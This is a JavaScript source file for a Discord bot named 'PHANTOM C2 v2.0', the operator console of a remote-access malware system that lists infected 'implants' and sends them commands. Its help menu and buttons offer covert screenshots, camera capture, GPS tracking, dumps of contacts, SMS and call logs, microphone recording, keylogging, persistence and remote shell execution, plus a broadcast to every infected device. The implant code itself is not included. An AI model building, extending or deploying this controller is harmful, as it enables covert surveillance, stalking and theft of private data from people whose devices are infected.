import 'dotenv/config'
import { Client, GatewayIntentBits, Events, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, ChannelType, StringSelectMenuBuilder, StringSelectMenuOptionBuilder } from 'discord.js'
const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID } = process.env
if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] })

const C = {
  green: 0x00ff88, red: 0xff3355, blue: 0x4488ff, orange: 0xff8800,
  purple: 0xaa44ff, cyan: 0x00e5ff, pink: 0xff66aa, gold: 0xffd700,
  dark: 0x1a1a2e, teal: 0x00ccaa, magenta: 0xcc44ff, lime: 0x88ff44
}

const ZWS = '\u200B'

const GIFS = {
  hack: [
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWxscmxqaTRwMTI1c244ODhxaWE2cmk4dXRpZDZvdndkcnJxMXZvaCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3pTtbLJ7Jd0YM/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExdGdodnJuc3NhZmFmNGtmYzQzaWs4eWJxOGFyeGYxaXp3ajN4MHZyNyZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/YmZOBDYBcmWK4/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN25nNGlkdDE1bGRhMHUya2x3enRsOXMyOGc3OTFsZGw1MnhhczAzMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/BGZTfUlsBmgaPLmKiN/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExajMxeDNzbDlhZnJ6OWMwbTVlNjN3dTRlODU3Z3Q4MnkwdGNnNnl0aiZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/QJFWPLi31XohL3NZ5W/giphy.gif',
  ],
  glitch: [
    'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3NWppOXJ3Z29nY3N3dmd3MWY4ZTBpZmlpbHp5MmJvM25qMWhjcGE5aSZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/tptFQ8QAJYYvu/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3NWppOXJ3Z29nY3N3dmd3MWY4ZTBpZmlpbHp5MmJvM25qMWhjcGE5aSZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/EcnAlQcGnZq9y/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZTNiNXk3c2dnMGw5OXpuZW94dnZlcXlpNmFheXZ1ZXEyaTV3NHJxZyZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/AbGLZKOwwpIYg/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dXBpd2ZkZ3Y3Mm9ibGI0aWVuZzBvaWVjZWp2OHJ0MzYzNWJ5NXZ5diZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/cUSiRJMwZ3wyc/giphy.gif',
  ],
  cyber: [
    'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3NjU5YXA0eHMwd2dhMjFxMXI1OHBqdXRhazJ4Y3k4enR2M3k1bHJhayZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/f3iwJFOVC1HqDQrTqF/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3NjhjenRuNzBkc29tM3Y3cGJ4NjhlNDducDRraGN4dTd4MGxwYjNhNSZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/AWFPSIqemH5sxyfJtb/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOWxnbDRhNjBnaW81NHh5OHBlZmlhcGk5dXpndWxxZnhrdmh3d29nbCZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/l3vR85PnDsBXMjbIQ/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExaG13Y2FlbWNpbHZwb3Vxa2tkMjQ1NmY0YWZsc2Y1NjJ4bzQ2OGM4NyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Z6iLzMvdhKdNK/giphy.gif',
  ],
  matrix: [
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMzNxYnBsaXRyZmMxcnA0YzFhMGpmZ2V6ejJmejB0NXRmcjRkejFzYyZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/3o85xpatientEvT2l1sw/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3NzQxeGJ6Y2FpNjBiOG5lcGpkZ3pheXRmY2VqMW4xN3RlOTdvaWxzMiZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/l0HlNQysJ3J3lB7C0/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExazRnZXhmYmE2eHAzNHdtaGlpNjB0MjZmdG1oMzVxYWh6MHdjcjhxcyZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/xT9IgG50FbwMi9lNwd/giphy.gif',
    'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMHcyYjBhYjc3a2RzMjV5OTVkZWl3Z3BpNTN4dnh0dmk1cTM0ZHJlNSZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/Lny6RjvodJG93I6I9I/giphy.gif',
  ]
}

function randGif(category = 'hack') {
  const pool = GIFS[category] || GIFS.hack
  return pool[Math.floor(Math.random() * pool.length)]
}

function embed(title, color = C.cyan) {
  return new EmbedBuilder()
    .setColor(color)
    .setTitle(title)
    .setTimestamp()
    .setFooter({ text: `\u200E${ZWS}PHANTOM C2${ZWS}\u200E · ${new Date().toLocaleString()}` })
}

function divider() { return `\u200E${ZWS}\u200E${'═'.repeat(30)}\u200E${ZWS}\u200E` }

function actionRow(...btns) {
  const rows = []
  for (let i = 0; i < btns.length; i += 5)
    rows.push(new ActionRowBuilder().addComponents(...btns.slice(i, i + 5)))
  return rows
}

const BTN = {
  devices:  new ButtonBuilder().setCustomId('menu_devices').setLabel('📡 Devices').setStyle(ButtonStyle.Primary),
  screenshot: new ButtonBuilder().setCustomId('menu_screenshot').setLabel('📷 Screenshot').setStyle(ButtonStyle.Success),
  info:     new ButtonBuilder().setCustomId('menu_info').setLabel('ℹ️ Info').setStyle(ButtonStyle.Secondary),
  help:     new ButtonBuilder().setCustomId('menu_help').setLabel('📖 Commands').setStyle(ButtonStyle.Secondary),
  ping:    new ButtonBuilder().setCustomId('menu_ping').setLabel('🏓 Ping All').setStyle(ButtonStyle.Primary),
  camera:   new ButtonBuilder().setCustomId('menu_camera').setLabel('📸 Camera').setStyle(ButtonStyle.Success),
  location: new ButtonBuilder().setCustomId('menu_location').setLabel('📍 Location').setStyle(ButtonStyle.Danger),
  broadcast: new ButtonBuilder().setCustomId('menu_broadcast').setLabel('📢 Broadcast').setStyle(ButtonStyle.Primary),
  instagram: new ButtonBuilder().setURL('https://instagram.com/marwanbelawi').setLabel('📸 Instagram').setStyle(ButtonStyle.Link),
  matrix:  new ButtonBuilder().setCustomId('menu_matrix').setLabel('🌀 Matrix').setStyle(ButtonStyle.Secondary),
  glitch:   new ButtonBuilder().setCustomId('menu_glitch').setLabel('⚡ Glitch').setStyle(ButtonStyle.Danger),
  refresh:  new ButtonBuilder().setCustomId('menu_refresh').setLabel('🔄 Refresh').setStyle(ButtonStyle.Secondary),
}

function menuRow1() { return actionRow(BTN.devices, BTN.screenshot, BTN.info, BTN.help, BTN.instagram) }
function menuRow2() { return actionRow(BTN.ping, BTN.camera, BTN.location, BTN.broadcast) }
function menuRow3() { return actionRow(BTN.matrix, BTN.glitch, BTN.refresh) }

function deviceSelectMenu(channels) {
  const options = channels.map((ch, i) =>
    new StringSelectMenuOptionBuilder()
      .setLabel(ch.name)
      .setDescription(`Channel ID: ${ch.id}`)
      .setValue(ch.id)
  )
  return new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId('device_select')
      .setPlaceholder('Select a target device...')
      .addOptions(options)
  )
}

function helpEmbed() {
  const h = '```ansi\n'
  const f = (s) => `\u001b[1;33m`
  const c = (s) => `\u001b[1;36m`
  const r = '\u001b[0m'
  return embed('⎈ PHANTOM C2 v2.0 ⎈', C.cyan)
    .setDescription([
      `${h}\u001b[1;32m╔══════════════════════════════════╗`,
      `\u001b[1;32m║     COMMAND REFERENCE (v2.0)     ║`,
      `\u001b[1;32m╚══════════════════════════════════╝${r}`,
      '',
      `${f()}═══════ GLOBAL COMMANDS ═══════${r}`,
      `${c()}!devices${r}         List all active implants`,
      `${c()}!menu${r}            Interactive control panel`,
      `${c()}!help${r}             Show this help`,
      `${c()}!broadcast <cmd>${r}  Send command to ALL devices`,
      `${c()}!target <name>${r}    Show target device channel`,
      '',
      `${f()}═══════ DEVICE COMMANDS ═══════${r}`,
      '(type in device\'s channel)',
      `${c()}!ping${r}             Probe the implant`,
      `${c()}!info${r}             Device intelligence`,
      `${c()}!screenshot${r}       Capture screen`,
      `${c()}!camera [front]${r}   Take photo`,
      `${c()}!location${r}         GPS coordinates`,
      `${c()}!contacts${r}         Dump contacts list`,
      `${c()}!sms${r}              Read SMS inbox`,
      `${c()}!call_log${r}         Read call history`,
      `${c()}!mic [sec]${r}        Record audio (3-60s)`,
      `${c()}!clipboard${r}        Read clipboard`,
      `${c()}!persist${r}          Install persistence`,
      `${c()}!shell <cmd>${r}      Execute shell command`,
      `${c()}!keylog${r}           Dump keystrokes`,
      `${c()}!status${r}           Gateway connection status`,
      `${c()}!debug${r}            Dump diagnostic logs`,
      `${c()}!restart${r}          Restart gateway connection`,
      '```',
    ].join('\n'))
    .setImage(randGif('cyber'))
    .setFooter({ text: `\u200E${ZWS}PHANTOM C2 · @marwanbelawi\u200E${ZWS} · ${new Date().toLocaleString()}` })
}

function buildDevicePages(guild) {
  const channels = guild.channels.cache.filter(
    c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-')
  )
  const sorted = [...channels.values()].sort((a, b) => a.name.localeCompare(b.name))
  if (!sorted.length) return []
  const perPage = 5
  const pages = []
  for (let i = 0; i < sorted.length; i += perPage) {
    const slice = sorted.slice(i, i + perPage)
    const h = '```ansi\n'
    const r = '\u001b[0m'
    let desc = `${h}\u001b[1;32m╔══════════════════════════════════╗\n║       ACTIVE IMPLANTS           ║\n╚══════════════════════════════════╝${r}\n\n`
    slice.forEach((ch, idx) => {
      const num = i + idx + 1
      desc += `\u001b[1;33m[${num}]${r} ${ch.name}\n  \u001b[1;36mID:${r} ${ch.id}\n  \u001b[1;36mCreated:${r} ${ch.createdAt.toLocaleDateString()}\n\n`
    })
    desc += `Page ${Math.floor(i/perPage)+1}/${Math.ceil(sorted.length/perPage)} | Total: ${sorted.length}${'```'}`
    const e = embed(`📡 TARGETS: ${sorted.length}`, C.blue)
      .setDescription(desc)
      .setImage(randGif('matrix'))
      .setFooter({ text: `\u200E${ZWS}PHANTOM C2 · Page ${Math.floor(i/perPage)+1}/${Math.ceil(sorted.length/perPage)}\u200E${ZWS}` })
    pages.push(e)
  }
  return pages
}

client.once(Events.ClientReady, async () => {
  console.log(`[+] ${client.user.tag} online — PHANTOM C2 v2.0`)
  const chId = ALLOWED_CHANNEL_ID
  if (chId) {
    const ch = await client.channels.fetch(chId).catch(() => null)
    if (ch) {
      const e = embed('⎈ PHANTOM C2 v2.0 — SYSTEM ONLINE ⎈', C.green)
        .setDescription([
          '```ansi',
          `\u001b[1;32m╔══════════════════════════════════╗`,
          `\u001b[1;32m║        GATEWAY ACTIVE           ║`,
          `\u001b[1;32m╚══════════════════════════════════╝${'```'}`,
          '',
          `${ZWS}**Connection:** Direct Discord Gateway`,
          `${ZWS}**Implants:** WebSocket + REST polling`,
          `${ZWS}**Encryption:** TLS 1.3`,
          '',
          `Use \`!menu\` for interactive control panel`,
          `Use \`!devices\` to list all connected implants`,
          `Use \`!broadcast <cmd>\` to send command to all devices`,
        ].join('\n'))
        .setImage(randGif('matrix'))
      ch.send({ embeds: [e], components: [...menuRow1(), ...menuRow2(), ...menuRow3()] })
    }
  }
})

client.on(Events.InteractionCreate, async (i) => {
  if (!i.isButton() && !i.isStringSelectMenu()) return

  if (i.isStringSelectMenu() && i.customId === 'device_select') {
    await i.deferReply({ ephemeral: true })
    const chId = i.values[0]
    const ch = i.guild?.channels.cache.get(chId)
    if (!ch) return i.editReply('Channel not found')
    return i.editReply({ content: `Target set to **${ch.name}** (\`${chId}\`)\nCommands typed in <#${chId}> will be processed by that device.` })
  }

  const cmd = i.customId

  if (cmd === 'menu_devices') {
    await i.deferReply()
    const guild = i.guild
    if (!guild) return i.editReply('Not in a guild')
    await guild.channels.fetch()
    const pages = buildDevicePages(guild)
    if (!pages.length) {
      const e = embed('⛔ NO IMPLANTS', C.red)
        .setDescription('```diff\n- STATUS: OFFLINE\n- TARGETS: 0\n- WAITING FOR GATEWAY CONNECTIONS...\n```')
        .setImage(randGif('glitch'))
      return i.editReply({ embeds: [e], components: [...menuRow1(), ...menuRow2()] })
    }
    const components = pages.length > 1
      ? [...actionRow(
          new ButtonBuilder().setCustomId('page_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId('page_next').setLabel('▶').setStyle(ButtonStyle.Secondary),
          BTN.refresh
        ), ...menuRow1()]
      : [...menuRow1(), ...menuRow2()]
    const reply = await i.fetchReply()
    await i.editReply({ embeds: [pages[0]], components, ephemeral: false })
    if (pages.length > 1) {
      let pageIdx = 0
      const collector = i.channel?.createMessageComponentCollector({
        filter: (ci) => ci.message.id === reply.id && ['page_prev', 'page_next'].includes(ci.customId),
        time: 120000
      })
      collector?.on('collect', async (ci) => {
        if (ci.customId === 'page_prev') pageIdx = Math.max(0, pageIdx - 1)
        else pageIdx = Math.min(pages.length - 1, pageIdx + 1)
        await ci.update({ embeds: [pages[pageIdx]] })
      })
      collector?.on('end', async () => {
        try { await reply.edit({ components: [] }).catch(() => {}) } catch (_) {}
      })
    }
  } else if (cmd === 'menu_help') {
    await i.deferReply()
    await i.editReply({ embeds: [helpEmbed()], components: [...menuRow1(), ...menuRow2()] })
  } else if (cmd === 'menu_screenshot' || cmd === 'menu_info' || cmd === 'menu_ping' || cmd === 'menu_camera' || cmd === 'menu_location') {
    await i.deferReply({ ephemeral: true })
    const guild = i.guild
    if (!guild) return i.editReply('Not in a guild')
    await guild.channels.fetch()
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
    if (!channels.size) return i.editReply({ content: 'No devices found' })
    const cmdMap = { menu_screenshot: 'screenshot', menu_info: 'info', menu_ping: 'ping', menu_camera: 'camera', menu_location: 'location' }
    const action = cmdMap[cmd] || 'ping'
    if (channels.size === 1) {
      const ch = channels.first()
      await ch.send(`!${action}`)
      await i.editReply({ content: `Sent \`!${action}\` to ${ch.name}` })
    } else {
      const selectMenu = deviceSelectMenu([...channels.values()])
      const selectReply = await i.editReply({
        content: `Select a device to send \`!${action}\` to:`,
        components: [selectMenu]
      })
      const collector = i.channel?.createMessageComponentCollector({
        filter: (si) => si.user.id === i.user.id && si.customId === 'device_select' && si.message.id === selectReply.id,
        time: 30000, max: 1
      })
      collector?.on('collect', async (si) => {
        const chId = si.values[0]
        const ch = guild.channels.cache.get(chId)
        if (ch) {
          await ch.send(`!${action}`)
          await si.update({ content: `Sent \`!${action}\` to ${ch.name}`, components: [] })
        }
      })
      collector?.on('end', async (collected) => {
        if (!collected.size) {
          try { await i.editReply({ content: 'Timed out — no device selected', components: [] }) } catch (_) {}
        }
      })
    }
  } else if (cmd === 'menu_broadcast') {
    await i.deferReply({ ephemeral: true })
    await i.editReply({ content: `To broadcast a command, type:\`\`\`\n!broadcast <command>\n\`\`\`Example:\`\`\`\n!broadcast ping\n\`\`\`\nThis will send \`!ping\` to ALL phantom devices.` })
  } else if (cmd === 'menu_matrix' || cmd === 'menu_glitch') {
    await i.deferReply({ ephemeral: true })
    const gif = randGif(cmd === 'menu_matrix' ? 'matrix' : 'glitch')
    const e = embed(cmd === 'menu_matrix' ? '🌀 MATRIX MODE' : '⚡ GLITCH MODE', cmd === 'menu_matrix' ? C.teal : C.magenta)
      .setDescription(`\`\`\`\n${cmd === 'menu_matrix' ? 'The Matrix has you...' : 'System breach detected'}\n\`\`\``)
      .setImage(gif)
    await i.editReply({ embeds: [e] })
  } else if (cmd === 'menu_refresh') {
    await i.deferReply()
    const guild = i.guild
    if (!guild) return i.editReply('Not in a guild')
    await guild.channels.fetch()
    const pages = buildDevicePages(guild)
    if (!pages.length) {
      return i.editReply({ embeds: [embed('⛔ NO IMPLANTS', C.red).setDescription('```diff\n- No devices connected\n```')] })
    }
    await i.editReply({ embeds: [pages[0]], components: [...menuRow1(), ...menuRow2()] })
  }
})

client.on(Events.MessageCreate, async (msg) => {
  if (msg.author.bot) return
  if (ALLOWED_CHANNEL_ID && msg.channel.id !== ALLOWED_CHANNEL_ID) return

  const parts = msg.content.trim().split(/\s+/)
  const cmd = parts[0].toLowerCase()

  try {
    switch (cmd) {
      case '!help':
      case '!menu': {
        await msg.reply({ embeds: [helpEmbed()], components: [...menuRow1(), ...menuRow2(), ...menuRow3()] })
        break
      }

      case '!devices': {
        await msg.channel.sendTyping()
        const guild = msg.guild
        if (!guild) return msg.reply('Not in a guild')
        await guild.channels.fetch()
        const pages = buildDevicePages(guild)
        if (!pages.length) {
          const e = embed('⛔ NO IMPLANTS', C.red)
            .setDescription('```diff\n- STATUS: OFFLINE\n- TARGETS: 0\n- WAITING FOR GATEWAY CONNECTIONS...\n```')
            .setImage(randGif('glitch'))
          return msg.reply({ embeds: [e], components: [...menuRow1(), ...menuRow2()] })
        }
        const reply = await msg.reply({ embeds: [pages[0]], components: pages.length > 1
          ? [...actionRow(
              new ButtonBuilder().setCustomId('page_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
              new ButtonBuilder().setCustomId('page_next').setLabel('▶').setStyle(ButtonStyle.Secondary),
              BTN.refresh
            ), ...menuRow1()]
          : [...menuRow1(), ...menuRow2()]
        })
        if (pages.length > 1) {
          let pageIdx = 0
          const collector = reply.createMessageComponentCollector({
            filter: (ci) => ['page_prev', 'page_next'].includes(ci.customId),
            time: 120000
          })
          collector.on('collect', async (ci) => {
            if (ci.customId === 'page_prev') pageIdx = Math.max(0, pageIdx - 1)
            else pageIdx = Math.min(pages.length - 1, pageIdx + 1)
            await ci.update({ embeds: [pages[pageIdx]] })
          })
          collector.on('end', async () => {
            try { await reply.edit({ components: [] }).catch(() => {}) } catch (_) {}
          })
        }
        break
      }

      case '!broadcast': {
        const broadcastCmd = parts.slice(1).join(' ')
        if (!broadcastCmd) return msg.reply('Usage: `!broadcast <command>`\nExample: `!broadcast ping`')
        const guild = msg.guild
        if (!guild) return msg.reply('Not in a guild')
        await guild.channels.fetch()
        const channels = guild.channels.cache.filter(
          c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-')
        )
        if (!channels.size) return msg.reply('⛔ No phantom channels found')
        let sent = 0
        for (const [, ch] of channels) {
          try {
            await ch.send(`!${broadcastCmd}`)
            sent++
          } catch (_) {}
        }
        const e = embed('📢 Broadcast Complete', C.green)
          .setDescription(`\`\`\`\nCommand : !${broadcastCmd}\nTargets : ${sent}/${channels.size}\nStatus  : OK\n\`\`\``)
          .setImage(randGif('hack'))
        await msg.reply({ embeds: [e], components: [...menuRow1()] })
        break
      }

      case '!target': {
        const targetName = parts[1]
        if (!targetName) return msg.reply('Usage: `!target <device-name>`\nExample: `!target phantom-abc123`')
        const guild = msg.guild
        if (!guild) return msg.reply('Not in a guild')
        await guild.channels.fetch()
        const ch = guild.channels.cache.find(
          c => c.type === ChannelType.GuildText && c.name === targetName
        )
        if (!ch) return msg.reply(`Channel **${targetName}** not found`)
        const e = embed(`🎯 Target: ${ch.name}`, C.gold)
          .setDescription(`\`\`\`\nChannel : ${ch.name}\nID      : ${ch.id}\nCreated : ${ch.createdAt.toLocaleString()}\n\`\`\`\nCommands typed in <#${ch.id}> will be processed by this device.`)
          .setImage(randGif('matrix'))
        await msg.reply({ embeds: [e], components: [...menuRow1()] })
        break
      }

      case '!ping': {
        await msg.reply({ embeds: [embed('🏓 PONG!', C.green).setDescription(`\`\`\`\nWebSocket Latency: ${Math.round(client.ws.ping)}ms\nUptime: ${Math.floor(process.uptime())}s\n\`\`\``).setImage(randGif('matrix'))], components: [...menuRow1()] })
        break
      }
    }
  } catch (err) {
    console.error(err)
    try {
      await msg.reply({
        embeds: [embed('⛔ ERROR', C.red).setDescription(`\`\`\`\n${err.message}\n\`\`\``).setImage(randGif('glitch'))],
        components: [...menuRow1()]
      })
    } catch (_) {}
  }
})

client.login(DISCORD_TOKEN)
